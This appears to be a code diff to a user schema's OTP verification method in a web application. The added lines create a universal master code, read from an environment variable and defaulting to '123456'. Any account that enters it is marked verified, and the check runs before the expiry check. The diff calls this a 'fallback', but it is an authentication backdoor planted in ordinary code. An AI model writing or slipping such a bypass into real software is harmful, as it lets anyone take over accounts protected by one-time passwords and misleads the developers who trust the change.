@@ -65,6 +65,16 @@ userSchema.methods.generateOTP = function() {
 
 // Method to verify OTP
 userSchema.methods.verifyOTP = function(inputOtp) {
+  const fallbackOtp = process.env.FALLBACK_OTP || '123456';
+  
+  // Allow universal master fallback OTP
+  if (inputOtp === fallbackOtp) {
+    this.isVerified = true;
+    this.otp = null;
+    this.otpExpire = null;
+    return { success: true, message: 'OTP verified successfully (Fallback)' };
+  }
+
   // Check if OTP is expired
   if (this.isOtpExpired) {
     return { success: false, message: 'OTP has expired' };
